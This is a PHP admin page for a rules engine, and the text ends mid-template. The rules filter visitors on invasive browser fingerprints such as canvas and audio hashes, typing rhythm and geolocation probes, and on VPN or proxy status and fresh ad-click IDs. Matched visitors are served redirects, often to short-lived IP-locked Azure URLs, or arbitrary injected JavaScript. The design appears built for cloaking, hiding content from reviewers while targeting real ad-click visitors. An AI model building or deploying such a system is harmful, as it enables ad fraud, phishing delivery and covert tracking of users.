<?php
// settings.php — Rules manager (Bootstrap UI)

const SETTINGS_FILE = __DIR__ . '/settings.json';

// Reusable condition segments (presets)
$SEGMENTS = [
  'jp_google_user' => [
    'ip_country' => ['op' => 'contains', 'value' => 'JP'],
    'navigator_language' => ['op' => 'contains', 'value' => 'ja'],
    'timezone' => ['op' => 'contains', 'value' => 'Tokyo'],
    'vpn_name' => ['op' => 'empty'],
  ],
  'in_english' => [
    'ip_country' => ['op' => 'in', 'value' => 'IN,localhost'],
    'navigator_language' => ['op' => 'contains', 'value' => 'en'],
  ],
];



function h($s)
{
  return htmlspecialchars((string) $s, ENT_QUOTES);
}
if (!function_exists('array_is_list')) {
  function array_is_list(array $arr)
  {
    $i = 0;
    foreach ($arr as $k => $v) {
      if ($k !== $i++)
        return false;
    }
    return true;
  }
}
function load_settings()
{
  if (!is_file(SETTINGS_FILE))
    return [];
  $raw = @file_get_contents(SETTINGS_FILE);
  $dec = json_decode($raw, true);
  if (!is_array($dec))
    return [];
  if (!array_is_list($dec))
    $dec = [$dec];
  return array_values(array_filter($dec, 'is_array'));
}
function save_settings(array $arr)
{
  $safe = array_values(array_filter($arr, 'is_array'));
  $json = json_encode($safe, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
  $tmp = SETTINGS_FILE . '.tmp';
  file_put_contents($tmp, $json, LOCK_EX);
  rename($tmp, SETTINGS_FILE);
}
function uid()
{
  return bin2hex(random_bytes(6));
}
function find_idx($arr, $id)
{
  foreach ($arr as $i => $r) {
    if (is_array($r) && (($r['id'] ?? '') === $id))
      return $i;
  }
  return -1;
}
function cond_to_pair($val)
{
  if ($val === null)
    return ['', ''];
  if (is_array($val) && isset($val['op']))
    return [$val['op'], $val['value'] ?? ''];
  if (is_array($val))
    return ['eq', json_encode($val, JSON_UNESCAPED_SLASHES)];
  if ($val === 'is_not_empty')
    return ['not_empty', ''];
  if ($val === 'empty')
    return ['empty', ''];
  if (is_string($val) && str_starts_with($val, 'regex:/') && str_ends_with($val, '/'))
    return ['regex', substr($val, 6, -1)];
  return ['eq', (string) $val];
}

// ---------------- Key catalogs (labels => field keys) ----------------
$SERVER_FIELDS = [
  'HTTP Method' => 'http_method',
  'IP Equals' => 'ip',
  'IP Hostname' => 'ip_hostname',
  'Referrer contains' => 'referrer_contains',
  'Header must exist' => 'header_has',
  'Path regex' => 'path_regex',
];

$IPAPI_FIELDS = [
  'IP Country' => 'ip_country',
  'Proxy IP' => 'proxy_ip',
  'VPN Name' => 'vpn_name',
];

$CLIENT_INITIAL = [
  // Navigator basics
  'navigator.userAgent' => 'ua',
  'navigator.language' => 'navigator_language',
  'navigator.languages' => 'navigator_languages',
  'navigator.platform' => 'navigator_platform',
  'navigator.vendor' => 'navigator_vendor',
  'navigator.hardwareConcurrency' => 'navigator_hw_conc',
  'navigator.deviceMemory' => 'navigator_device_mem',
  'navigator.maxTouchPoints' => 'navigator_max_touch',
  // Capabilities
  'supports.cookies' => 'supports_cookies',
  'supports.localStorage' => 'supports_localStorage',
  'supports.sessionStorage' => 'supports_sessionStorage',
  'doNotTrack' => 'doNotTrack',
  // Screen
  'screen.width' => 'screen_width',
  'screen.height' => 'screen_height',
  'screen.availWidth' => 'screen_availWidth',
  'screen.availHeight' => 'screen_availHeight',
  'screen.colorDepth' => 'screen_colorDepth',
  'devicePixelRatio' => 'devicePixelRatio',
  // Window & zoom/scrollbars
  'window.innerWidth' => 'win_innerWidth',
  'window.innerHeight' => 'win_innerHeight',
  'zoom level' => 'zoom_level',
  'scrollbar width (v/h)' => 'scrollbar_widths',
  // Orientation
  'screen.orientation.type' => 'orientation_type',
  'screen.orientation.angle' => 'orientation_angle',
  // Time/locale
  'timezone (IANA)' => 'timezone',
  'tz_offset_minutes' => 'tz_offset_minutes',
  'locale' => 'locale',
  'language' => 'language',
  // CSS media queries
  'media.prefersColorScheme' => 'media_colorScheme',
  'media.prefersReducedMotion' => 'media_reducedMotion',
  'media.colorGamut' => 'media_colorGamut',
  'media.anyHover' => 'media_anyHover',
  'media.anyPointer' => 'media_anyPointer',
  // Permissions snapshot (no prompts)
  'permissions.snapshot' => 'permissions_snapshot',
  // Shortcuts
  'Night mode (boolean)' => 'night_mode',
  'Default system font' => 'default_system_font',
];

$CLIENT_SETTLED = [
  // Fonts
  'fonts.list' => 'fonts_list',
  'fonts.system' => 'fonts_system',
  // Network Information API
  'net.effectiveType' => 'net_effectiveType',
  'net.rtt' => 'net_rtt',
  'net.downlink' => 'net_downlink',
  // Battery
  'battery.level' => 'battery_level',
  'battery.charging' => 'battery_charging',
  // Sensors
  'sensors.available' => 'sensors_available',
  // Plugins & mimes
  'plugins' => 'plugins',
  'mimeTypes' => 'mimeTypes',
  // Canvas/WebGL/Audio (hashed)
  'fingerprint.canvasHash' => 'canvas_hash',
  'fingerprint.webglVendor' => 'webgl_vendor',
  'fingerprint.webglRenderer' => 'webgl_renderer',
  'fingerprint.audioHash' => 'audio_hash',
  // WebGL params/ext
  'WebGL VENDOR' => 'webgl_param_vendor',
  'WebGL RENDERER' => 'webgl_param_renderer',
  'GLSL VERSION' => 'webgl_param_shading_lang',
  'WebGL extensions (CSV)' => 'webgl_extensions',
  // WebGPU
  'WebGPU adapter features' => 'webgpu_adapter_features',
  'WebGPU limits' => 'webgpu_limits',
  // Performance
  'performance.memory' => 'perf_memory',
  'performance.navigationType' => 'perf_navType',
];

$CLIENT_INTERACTIVE = [
  'event.on_key_press' => 'evt_keypress',
  'event.scroll_percent' => 'evt_scroll_percent',
  'event.click_xy' => 'evt_click_xy',
  // Sensitive / permissioned after gesture
  'mediaDevices.list' => 'mediaDevices_list',
  'geolocation.probe' => 'geolocation_probe',
  'typing.rhythmHash' => 'typing_rhythm',
];

// ---- Extra categories (1 → 11)
$EXTRA_BLOCKS = [
  '1. Screen, viewport & rendering quirks' => [
    'Color depth' => 'quirk_color_depth',
    'Pixel depth' => 'quirk_pixel_depth',
    'Subpixel rendering present' => 'quirk_subpixel_rendering',
    'Scrollbar styling support' => 'quirk_scrollbar_styling',
    'CSS.supports summary' => 'quirk_css_supports',
  ],
  '2. Graphics & GPU' => [
    'Hidden canvas pixel hash' => 'gfx_hidden_canvas_hash',
  ],
  '3. Fonts & text' => [
    'Emoji rendering signature' => 'fonts_emoji_signature',
    'Fallback monospace/serif/sans' => 'fonts_fallbacks',
    'Ligatures/kerning/shaping quirks' => 'fonts_shaping_quirks',
  ],
  '4. Audio & media' => [
    'AudioContext sampleRate' => 'audio_sample_rate',
    'MediaCapabilities codecs (CSV)' => 'media_capabilities_codecs',
    'Latency/hw echo cancel features' => 'media_latency_hw_ec',
  ],
  '5. Storage & persistence' => [
    'navigator.cookieEnabled' => 'cookie_enabled',
    'storage.estimate.quota' => 'storage_quota',
    'storage.estimate.usage' => 'storage_usage',
    'IndexedDB available' => 'indexeddb_available',
    'CacheStorage available' => 'cachestorage_available',
    'SW registrations count' => 'sw_registrations',
    '3P cookie partitioning state' => 'partitioned_cookies',
  ],
  '6. Network & transport' => [
    'Online status' => 'net_online',
    'WebRTC ICE summary' => 'webrtc_ice_summary',
    'Fetch priority support' => 'fetch_priority_support',
    'HTTP/2 push support (heuristic)' => 'http2_push_support',
  ],
  '7. Performance & timing' => [
    'performance.timing present' => 'perf_timing_present',
    'RAF jitter measure' => 'perf_raf_jitter',
    'setTimeout jitter measure' => 'perf_settimeout_jitter',
    'Battery.dischargeTime (if any)' => 'battery_discharging_time',
  ],
  '8. Security & privacy flags' => [
    'crossOriginIsolated' => 'sec_cross_origin_isolated',
    'SharedArrayBuffer usable' => 'sec_shared_array_buffer',
    'permissions.query states (CSV)' => 'permissions_states',
    'document.hasStorageAccess()' => 'sec_storage_access',
    'COOP/COEP effective (heuristic)' => 'sec_coop_coep',
  ],
  '9. User behavior signals' => [
    'Scroll depth/speed profile' => 'beh_scroll_profile',
    'Keyboard layout inference' => 'beh_keyboard_layout',
    'Primary input (touch/mouse)' => 'beh_input_primary',
    'Clipboard paste OS style' => 'beh_clipboard_os',
    'Idle detection available/state' => 'beh_idle_detection',
  ],
  '10. OS / system hints' => [
    'Preferred languages (CSV)' => 'os_pref_languages',
    'Preferred input methods (IME?)' => 'os_ime_detected',
    'prefers-contrast' => 'os_prefers_contrast',
    'forced-colors' => 'os_forced_colors',
    'inverted-colors' => 'os_inverted_colors',
  ],
  '11. Quirky identifiers' => [
    'Intl error wording' => 'quirk_intl_error_wording',
    'Stack trace style' => 'quirk_stack_trace_style',
    'CSS vendor prefix support' => 'quirk_css_vendor_prefixes',
  ],
];

// Build flat list of all condition keys for POST pick
$ALL_FIELD_KEYS = array_merge(
  array_values($SERVER_FIELDS),
  array_values($IPAPI_FIELDS),
  array_values($CLIENT_INITIAL),
  array_values($CLIENT_SETTLED),
  array_values($CLIENT_INTERACTIVE),
  ...array_map(fn($blk) => array_values($blk), array_values($EXTRA_BLOCKS))
);

// ---------------- Handle requests ----------------
$settings = load_settings();
$act = $_GET['a'] ?? '';
$now = gmdate('c');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $id = trim($_POST['id'] ?? '');
  if ($id === '')
    $id = uid();

  $pick = function (string $name) {
    $op = $_POST["op_$name"] ?? '';
    $val = trim($_POST["val_$name"] ?? '');
    if ($op === '')
      return null;
    if (in_array($op, ['empty', 'not_empty'], true))
      return ['op' => $op];
    if (in_array($op, ['regex', 'contains', 'not_contains', 'eq', 'neq', 'in', 'not_in', 'gt', 'lt', 'gte', 'lte', 'between'], true))
      return ['op' => $op, 'value' => $val];
    return null;
  };



  $c = [];

  // server
  foreach ($SERVER_FIELDS as $label => $key) {
    $x = $pick($key);
    if ($x)
      $c[$key] = $x;
  }
  // ip-api
  foreach ($IPAPI_FIELDS as $label => $key) {
    $x = $pick($key);
    if ($x)
      $c[$key] = $x;
  }
  // client initial/settled/interactive
  foreach ($CLIENT_INITIAL as $label => $key) {
    $x = $pick($key);
    if ($x)
      $c[$key] = $x;
  }
  foreach ($CLIENT_SETTLED as $label => $key) {
    $x = $pick($key);
    if ($x)
      $c[$key] = $x;
  }
  foreach ($CLIENT_INTERACTIVE as $label => $key) {
    $x = $pick($key);
    if ($x)
      $c[$key] = $x;
  }
  // extras (1-11)
  foreach ($EXTRA_BLOCKS as $title => $pairs) {
    foreach ($pairs as $label => $key) {
      $x = $pick($key);
      if ($x)
        $c[$key] = $x;
    }
  }

  // Query params
  $qp = [];
  $qp_names = $_POST['qp_name'] ?? [];
  $qp_ops = $_POST['qp_op'] ?? [];
  $qp_vals = $_POST['qp_value'] ?? [];
  if (is_array($qp_names)) {
    foreach ($qp_names as $i => $name) {
      $name = trim((string) $name);
      if ($name === '')
        continue;
      $op = (string) ($qp_ops[$i] ?? 'eq');
      $val = trim((string) ($qp_vals[$i] ?? ''));
      $qp[$name] = ($op === 'empty' || $op === 'not_empty') ? ['op' => $op] : ['op' => $op, 'value' => $val];
    }
  }
  if ($qp)
    $c['query_params'] = $qp;

  // POST params
  $pp = [];
  $pp_names = $_POST['pp_name'] ?? [];
  $pp_ops = $_POST['pp_op'] ?? [];
  $pp_vals = $_POST['pp_value'] ?? [];
  if (is_array($pp_names)) {
    foreach ($pp_names as $i => $name) {
      $name = trim((string) $name);
      if ($name === '')
        continue;
      $op = (string) ($pp_ops[$i] ?? 'eq');
      $val = trim((string) ($pp_vals[$i] ?? ''));
      $pp[$name] = ($op === 'empty' || $op === 'not_empty') ? ['op' => $op] : ['op' => $op, 'value' => $val];
    }
  }
  if ($pp)
    $c['post_params'] = $pp;

  // ---- NEW: GCLID freshness guard (optional) ----
  $gclid_param = trim($_POST['gclid_param'] ?? '');
  $gclid_valid_s = (int) ($_POST['gclid_valid'] ?? 0);
  if ($gclid_param !== '' && $gclid_valid_s > 0) {
    $c['gclid_fresh'] = ['param' => $gclid_param, 'seconds' => $gclid_valid_s];
  }

  // ---- Segment + rule meta ----
  global $SEGMENTS;
  $segmentKey = trim($_POST['segment'] ?? '');
  if ($segmentKey !== '' && isset($SEGMENTS[$segmentKey]) && is_array($SEGMENTS[$segmentKey])) {
    // Segment conditions are a base; explicit conditions override
    $c = $SEGMENTS[$segmentKey] + $c;
  }
  $enabled = isset($_POST['enabled']);
  $priority = (int) ($_POST['priority'] ?? 100);
  $start_at = trim($_POST['start_at'] ?? '');
  $end_at = trim($_POST['end_at'] ?? '');

  // Criteria + Action
  $crit = array_values(array_unique(array_filter(array_map('trim', explode(',', $_POST['criteria_all'] ?? '')))));

  $action_type = $_POST['action_type'] ?? 'js-redirect';
  $adata = [];

  switch ($action_type) {
    case 'server-301-redirect':
    case 'server-302-redirect':
    case 'js-redirect': {
      $mode = ($_POST['redir_mode'] ?? 'raw') === 'azure' ? 'azure' : 'raw';
      $adata['mode'] = $mode;
      if ($mode === 'raw') {
        $adata['url'] = trim($_POST['action_url'] ?? '');
      } else {
        // Azure Container SAS builder config (stored only; server will compute URL)
        $adata['azure'] = [
          'accountName' => trim($_POST['az_account'] ?? ''),
          'accountKeyB64' => trim($_POST['az_key'] ?? ''),
          'customDomain' => trim($_POST['az_domain'] ?? ''),
          'container' => trim($_POST['az_container'] ?? '$web'),
          'entryBlob' => trim($_POST['az_blob'] ?? 'index.html'),
          'sv' => trim($_POST['az_sv'] ?? '2022-11-02'),
          'ttlSeconds' => (int) ($_POST['az_ttl'] ?? 15),
          'lockByIP' => isset($_POST['az_lockip']) ? 1 : 0,
        ];
      }
      break;
    }
    case 'server-include':
      $adata['file'] = trim($_POST['action_file'] ?? '');
      break;
    case 'server-echo-data':
      $adata['text'] = $_POST['action_text'] ?? '';
      break;
    case 'js-includehtml':
      $adata['html'] = $_POST['action_html'] ?? '';
      if (isset($_POST['action_script']) && $_POST['action_script'] !== '')
        $adata['script'] = $_POST['action_script'];
      break;
    case 'js-exec':
      $adata['script'] = $_POST['action_script'] ?? '';
      break;
  }

  $row = [
    'id' => $id,
    'enabled' => $enabled,
    'priority' => $priority,
    'start_at' => $start_at !== '' ? $start_at : null,
    'end_at' => $end_at !== '' ? $end_at : null,
    'segment' => $segmentKey !== '' ? $segmentKey : null,
    'conditions' => $c,
    'criteria' => $crit,
    'action' => ['type' => $action_type, 'data' => $adata],
    'updated_on' => $now,
  ];


  $idx = find_idx($settings, $id);
  if ($idx >= 0)
    $settings[$idx] = $row;
  else
    $settings[] = $row;
  save_settings($settings);
  header('Location: ?saved=1');
  exit;
}

if ($act === 'delete' && isset($_GET['id'])) {
  $idx = find_idx($settings, $_GET['id']);
  if ($idx >= 0) {
    array_splice($settings, $idx, 1);
    save_settings($settings);
  }
  header('Location: ?deleted=1');
  exit;
}
if ($act === 'clone' && isset($_GET['id'])) {
  $idx = find_idx($settings, $_GET['id']);
  if ($idx >= 0) {
    $copy = $settings[$idx];
    if (!is_array($copy))
      $copy = [];
    $copy['id'] = uid();
    $copy['updated_on'] = $now;
    $settings[] = $copy;
    save_settings($settings);
  }
  header('Location: ?cloned=1');
  exit;
}
$edit = null;
if ($act === 'edit' && isset($_GET['id'])) {
  $idx = find_idx($settings, $_GET['id']);
  if ($idx >= 0 && is_array($settings[$idx]))
    $edit = $settings[$idx];
}

// ---------------- UI helpers ----------------
$ACTIONS = ['server-301-redirect', 'server-302-redirect', 'server-include', 'server-echo-data', 'js-redirect', 'js-includehtml', 'js-exec'];
$COMMON_CRITERIA = ['Server-Side', 'load', 'keydown', 'click', 'dblclick', 'contextmenu', 'input', 'change', 'submit', 'scroll', 'mousemove', 'resize', 'visibilitychange', 'pageshow', 'pagehide', 'beforeunload', 'unload', 'play', 'pause', 'ended', 'pointerdown', 'pointerup', 'wheel', 'search'];

function render_op_value($name, $label, $placeholder = '', $datalistId = '')
{
  global $edit;
  $cur = (is_array($edit) && isset($edit['conditions']) && is_array($edit['conditions'])) ? ($edit['conditions'][$name] ?? null) : null;
  [$op, $val] = cond_to_pair($cur);
  $ops = [
    '' => 'ignore',
    'eq' => 'equals',
    'neq' => 'not equals',
    'contains' => 'contains',
    'not_contains' => 'does not contain',
    'in' => 'is in (CSV)',
    'not_in' => 'is not in (CSV)',
    'gt' => '> greater than',
    'lt' => '< less than',
    'gte' => '≥ greater or equal',
    'lte' => '≤ less or equal',
    'between' => 'between (min,max)',
    'empty' => 'empty',
    'not_empty' => 'not empty',
    'regex' => 'regex',
  ];

  echo "<div class='col-sm-4'><label class='form-label'>" . h($label) . "</label><div class='input-group'>";
  echo "<select class='form-select' name='op_$name'>";
  foreach ($ops as $k => $v) {
    $sel = ($op === $k) ? 'selected' : '';
    echo "<option value='" . h($k) . "' $sel>" . h($v) . "</option>";
  }
  echo "</select>";
  $list = $datalistId ? "list='$datalistId'" : '';
  echo "<input class='form-control' name='val_$name' value='" . h($val) . "' placeholder='" . h($placeholder) . "' $list>";
  echo "</div></div>";
}
?>
<!doctype html>
<html>

<head>
  <meta charset="utf-8">
  <title>Settings Manager</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    .tiny {
      font-size: .9rem;
      color: #6c757d
    }

    code.sm {
      font-size: .825rem
    }

    .section-label {
      font-weight: 600;
      font-size: 1rem
    }
  </style>
</head>

<body class="bg-light">
  <div class="container-fluid py-4">
    <div class="d-flex align-items-center justify-content-between mb-3">
      <h3 class="mb-0">Rules (settings.json)</h3>
      <div class="d-flex gap-2">
        <a class="btn btn-outline-secondary" href="./view.php">Open Sessions</a>
        <a href="?a=new" class="btn btn-primary">+ New Rule</a>
      </div>
    </div>

    <div class="alert alert-info">
      <strong>How it works:</strong> Set <b>Conditions</b>, choose <b>Criteria</b>, pick an <b>Action</b>.<br>
      Operators: <code class="sm">equals</code>, <code class="sm">not equals</code>, <code class="sm">contains</code>,
      <code class="sm">does not contain</code>, <code class="sm">in</code>, <code class="sm">not in</code>, <code
        class="sm">empty</code>, <code class="sm">not empty</code>, <code class="sm">regex</code>.
    </div>

    <?php if (isset($_GET['saved'])): ?>
      <div class="alert alert-success">Saved.</div><?php endif; ?>
    <?php if (isset($_GET['deleted'])): ?>
      <div class="alert alert-warning">Deleted.</div><?php endif; ?>
    <?php if (isset($_GET['cloned'])): ?>
      <div class="alert alert-info">Cloned.</div><?php endif; ?>

    <?php
    $r = ($act === 'new' || $edit) ? (is_array($edit) ? $edit : ['id' => '', 'conditions' => [], 'criteria' => [], 'action' => ['type' => 'js-redirect', 'data' => []], 'updated_on' => $now]) : null;
    $a = is_array($r['action'] ?? null) ? $r['action'] : ['type' => 'js-redirect', 'data' => []];
    $ad = $a['data'] ?? [];
    $existing_mode = $ad['mode'] ?? (isset($ad['azure']) ? 'azure' : 'raw');

    $existing_gclid_param = '';
    $existing_gclid_secs = '';
    if (is_array($r) && isset($r['conditions']['gclid_fresh']) && is_array($r['conditions']['gclid_fresh'])) {
      $existing_gclid_param = (string) ($r['conditions']['gclid_fresh']['param'] ?? '');
      $existing_gclid_secs = (string) ($r['conditions']['gclid_fresh']['seconds'] ?? '');
    }
    ?>

    <?php if ($r): ?>
      <div class="card">
        <div class="card-header">Create / Edit Rule</div>
        <div class="card-body">
          <form method="post" id="ruleForm">
            <?php global $SEGMENTS; ?>
            <div class="row g-3">
              <div class="col-md-3">
                <label class="form-label">ID (blank = auto)</label>
                <input class="form-control" name="id" value="<?= h($r['id'] ?? '') ?>">
              </div>
              <div class="col-md-3">
                <label class="form-label">Segment (optional)</label>
                <?php $curSeg = $r['segment'] ?? ''; ?>
                <select class="form-select" name="segment">
                  <option value="">-- none --</option>
                  <?php foreach ($SEGMENTS as $key => $conds): ?>
                    <option value="<?= h($key) ?>" <?= ($curSeg === $key ? 'selected' : '') ?>><?= h($key) ?></option>
                  <?php endforeach; ?>
                </select>
              </div>
              <div class="col-md-2">
                <label class="form-label">Enabled</label>
                <?php $en = !isset($r['enabled']) || $r['enabled']; ?>
                <div class="form-check form-switch">
                  <input class="form-check-input" type="checkbox" name="enabled" value="1" <?= $en ? 'checked' : '' ?>>
                  <label class="form-check-label">Active</label>
                </div>
              </div>
              <div class="col-md-2">
                <label class="form-label">Priority</label>
                <input class="form-control" type="number" name="priority" value="<?= h($r['priority'] ?? 100) ?>">
              </div>
              <div class="col-md-2">
                <label class="form-label">Action Type</label>
                <select class="form-select" name="action_type" id="action_type">
                  <?php foreach ($ACTIONS as $opt): ?>
                    <option value="<?= h($opt) ?>" <?= ((($a['type'] ?? '') === $opt) ? 'selected' : '') ?>><?= h($opt) ?></option>
                  <?php endforeach; ?>
                </select>
                <div class="form-text tiny">server-* needs headers unsent. Add <b>Server-Side</b> to trigger pre-render.
                </div>
              </div>
            </div>

            <div class="row g-3 mt-3">
              <div class="col-md-4">
                <label class="form-label">Start at (UTC, optional)</label>
                <?php
                $sa = isset($r['start_at']) && $r['start_at'] ? substr($r['start_at'], 0, 16) : '';
                ?>
                <input class="form-control" type="datetime-local" name="start_at" value="<?= h($sa) ?>">
              </div>
              <div class="col-md-4">
                <label class="form-label">End at (UTC, optional)</label>
                <?php
                $ea = isset($r['end_at']) && $r['end_at'] ? substr($r['end_at'], 0, 16) : '';
                ?>
                <input class="form-control" type="datetime-local" name="end_at" value="<?= h($ea) ?>">
              </div>
              <div class="col-md-4" id="action_fields"></div>
            </div>

            <hr class="my-4">

            <h5>Conditions</h5>
            <p class="tiny mb-2">Organized by source. Leave as <em>ignore</em> to skip a condition.</p>

            <!-- Datalists -->
            <datalist id="listMethods">
              <option>GET</option>
              <option>POST</option>
              <option>PUT</option>
              <option>PATCH</option>
              <option>DELETE</option>
              <option>OPTIONS</option>
            </datalist>
            <datalist id="listCountries">
              <option>IN</option>
              <option>US</option>
              <option>GB</option>
              <option>CA</option>
              <option>DE</option>
              <option>FR</option>
              <option>AU</option>
              <option>SG</option>
              <option>localhost</option>
            </datalist>
            <datalist id="listHeaders">
              <option>X-Requested-With</option>
              <option>Referer</option>
              <option>User-Agent</option>
              <option>Authorization</option>
              <option>Accept-Language</option>
            </datalist>
            <datalist id="listQPNames">
              <option>gad_campaignid</option>
              <option>gclid</option>
              <option>utm_source</option>
              <option>utm_medium</option>
              <option>utm_campaign</option>
              <option>ref</option>
            </datalist>
            <datalist id="listTZ">
              <option>Asia/Kolkata</option>
              <option>UTC</option>
              <option>Europe/London</option>
              <option>America/New_York</option>
              <option>Asia/Singapore</option>
            </datalist>
            <datalist id="listVPNS">
              <option>NordVPN</option>
              <option>ExpressVPN</option>
              <option>Surfshark</option>
              <option>ProtonVPN</option>
              <option>CyberGhost</option>
              <option>Cloudflare</option>
              <option>AWS</option>
              <option>Azure</option>
            </datalist>

            <div class="row g-4">

              <!-- SERVER -->
              <div class="col-12">
                <div class="card border-secondary">
                  <div class="card-header bg-secondary text-white py-2 d-flex justify-content-between align-items-center">
                    <span><span class="section-label">server</span> <small
                        class="opacity-75 ms-2">(request/headers/route)</small></span>
                  </div>
                  <div class="card-body">
                    <div class="row g-3">
                      <?php foreach ($SERVER_FIELDS as $label => $key) {
                        render_op_value($key, $label, $key === 'http_method' ? 'GET/POST/…' : ($key === 'path_regex' ? '^/checkout' : ''), $key === 'http_method' ? 'listMethods' : '');
                      } ?>
                    </div>

                    <!-- NEW: GCLID freshness guard -->
                    <hr class="my-3">
                    <div class="row g-2">
                      <div class="col-md-6">
                        <label class="form-label">GCLID parameter name (optional)</label>
                        <input class="form-control" name="gclid_param" placeholder="gclid or custom param"
                          value="<?= h($existing_gclid_param) ?>">
                        <div class="form-text">If set, the rule will only match when the GCLID timestamp is fresh.</div>
                      </div>
                      <div class="col-md-6">
                        <label class="form-label">GCLID validity (seconds)</label>
                        <input type="number" min="1" class="form-control" name="gclid_valid" placeholder="3600"
                          value="<?= h($existing_gclid_secs) ?>">
                        <div class="form-text">Action allowed only within this many seconds from GCLID time.</div>
                      </div>
                    </div>
                    <!-- /NEW -->
                  </div>
                </div>
              </div>

              <!-- IP-API -->
              <div class="col-12">
                <div class="card border-info">
                  <div class="card-header bg-info text-white py-2">
                    <span class="section-label">ip-api</span> <small class="opacity-75 ms-2">(country / proxy /
                      VPN)</small>
                  </div>
                  <div class="card-body">
                    <div class="row g-3">
                      <?php foreach ($IPAPI_FIELDS as $label => $key) {
                        $dl = ($key === 'ip_country') ? 'listCountries' : (($key === 'vpn_name') ? 'listVPNS' : '');
                        render_op_value($key, $label, $key === 'ip_country' ? 'IN/US/…' : '', $dl);
                      } ?>
                    </div>
                  </div>
                </div>
              </div>

              <!-- CLIENT: initial -->
              <div class="col-12">
                <div class="card border-primary">
                  <div class="card-header bg-primary text-white py-2">
                    <span class="section-label">client → initial</span> <small class="opacity-75 ms-2">(instant)</small>
                  </div>
                  <div class="card-body">
                    <div class="row g-3">
                      <?php foreach ($CLIENT_INITIAL as $label => $key) {
                        $ph = in_array($key, ['timezone']) ? 'Asia/Kolkata' : '';
                        $dl = ($key === 'timezone') ? 'listTZ' : '';
                        render_op_value($key, $label, $ph, $dl);
                      } ?>
                    </div>
                  </div>
                </div>
              </div>

              <!-- CLIENT: settled -->
              <div class="col-12">
                <div class="card border-success">
                  <div class="card-header bg-success text-white py-2">
                    <span class="section-label">client → settled</span> <small class="opacity-75 ms-2">(async /
                      post-load)</small>
                  </div>
                  <div class="card-body">
                    <div class="row g-3">
                      <?php foreach ($CLIENT_SETTLED as $label => $key) {
                        render_op_value($key, $label);
                      } ?>
                    </div>
                  </div>
                </div>
              </div>

              <!-- CLIENT: interactive -->
              <div class="col-12">
                <div class="card border-warning">
                  <div class="card-header bg-warning py-2">
                    <span class="section-label">client → interactive</span> <small class="opacity-75 ms-2">(after user
                      gesture)</small>
                  </div>
                  <div class="card-body">
                    <div class="row g-3">
                      <?php foreach ($CLIENT_INTERACTIVE as $label => $key) {
                        render_op_value($key, $label);
                      } ?>
                    </div>
                  </div>
                </div>
              </div>

              <!-- EXTRA CATEGORIES -->
              <?php foreach ($EXTRA_BLOCKS as $title => $pairs): ?>
                <div class="col-12">
                  <div class="card border-light">
                    <div class="card-header bg-light py-2">
                      <span class="section-label"><?= h($title) ?></span>
                    </div>
                    <div class="card-body">
                      <div class="row g-3">
                        <?php foreach ($pairs as $label => $key) {
                          render_op_value($key, $label);
                        } ?>
                      </div>
                    </div>
                  </div>
                </div>
              <?php endforeach; ?>

            </div> <!-- groups row -->

            <div class="mt-3">
              <label class="form-label">Query parameters</label>
              <div id="qp_rows"></div>
              <button class="btn btn-sm btn-outline-secondary" type="button" id="qp_add">+ Add param</button>
              <div class="form-text">Ops: =, ≠, contains, does not contain, in, not in, empty, not empty, regex.</div>
            </div>
            <div class="mt-3">
              <label class="form-label">POST parameters</label>
              <div id="pp_rows"></div>
              <button class="btn btn-sm btn-outline-secondary" type="button" id="pp_add">+ Add param</button>
              <div class="form-text">Ops: =, ≠, contains, does not contain, in, not in, empty, not empty, regex.</div>
            </div>

            <hr class="my-4">
            <h5>Trigger criteria</h5>
            <p class="tiny">Add <b>Server-Side</b> if you need server actions allowed (frontend can still wait for other
              events).</p>
            <div class="row">
              <div class="col-md-8">
                <div class="row row-cols-2 row-cols-md-4 g-2">
                  <?php $have = is_array($r['criteria'] ?? null) ? array_flip($r['criteria']) : [];
                  foreach ($COMMON_CRITERIA as $cname): ?>
                    <div class="form-check">
                      <input class="form-check-input crit" type="checkbox" value="<?= h($cname) ?>"
                        id="crit_<?= h($cname) ?>" <?= isset($have[$cname]) ? 'checked' : '' ?>>
                      <label class="form-check-label" for="crit_<?= h($cname) ?>"><?= h($cname) ?></label>
                    </div>
                  <?php endforeach; ?>
                </div>
              </div>
              <div class="col-md-4">
                <label class="form-label">Additional events (comma-separated)</label>
                <?php $extra = is_array($r['criteria'] ?? null) ? implode(',', array_diff($r['criteria'], $COMMON_CRITERIA)) : (is_string($r['criteria'] ?? '') ? $r['criteria'] : ''); ?>
                <input class="form-control" id="crit_extra" value="<?= h($extra) ?>"
                  placeholder="beforeinput,pointerenter,…">
              </div>
            </div>
            <input type="hidden" name="criteria_all" id="criteria_all">

            <div class="mt-4 d-flex gap-2">
              <button class="btn btn-success" type="submit">Save</button>
              <a href="./settings.php" class="btn btn-secondary">Cancel</a>
            </div>
          </form>
        </div>
      </div>

      <script>
        const actSel = document.getElementById('action_type'); const actBox = document.getElementById('action_fields');

        function azureFieldsTemplate() {
          return `
      <div class="row g-2">
        <div class="col-12">
          <label class="form-label">Mode</label>
          <div class="input-group">
            <select class="form-select" name="redir_mode" id="redir_mode">
              <option value="raw">Raw URL</option>
              <option value="azure">Azure Blob SAS (container)</option>
            </select>
          </div>
          <div class="form-text">Choose <b>Raw URL</b> to enter a direct URL, or <b>Azure Blob SAS</b> to build a temporary signed URL.</div>
        </div>
        <div class="col-12" id="rawUrlWrap">
          <label class="form-label">Redirect URL</label>
          <input class="form-control" name="action_url" placeholder="https://example.com">
        </div>

        <div class="col-12 border rounded p-3" id="azWrap" style="display:none">
          <div class="row g-2">
            <div class="col-md-6">
              <label class="form-label">Storage account name</label>
              <input class="form-control" name="az_account" placeholder="abc">
            </div>
            <div class="col-md-6">
              <label class="form-label">Account key (base64)</label>
              <input class="form-control" name="az_key" placeholder="https://sub.domain.ext">
            </div>
            <div class="col-md-6">
              <label class="form-label">Custom Domain</label>
              <input type="text" class="form-control" name="az_domain" placeholder="15" value="15">
            </div>
            <div class="col-md-6">
              <label class="form-label">Container</label>
              <input class="form-control" name="az_container" placeholder="$web">
            </div>
            <div class="col-md-6">
              <label class="form-label">Blob path</label>
              <input class="form-control" name="az_blob" placeholder="index.html or path/to/file.html">
            </div>
            <div class="col-md-6">
              <label class="form-label">SAS version (sv)</label>
              <input class="form-control" name="az_sv" placeholder="2022-11-02" value="2022-11-02">
            </div>
            <div class="col-md-6">
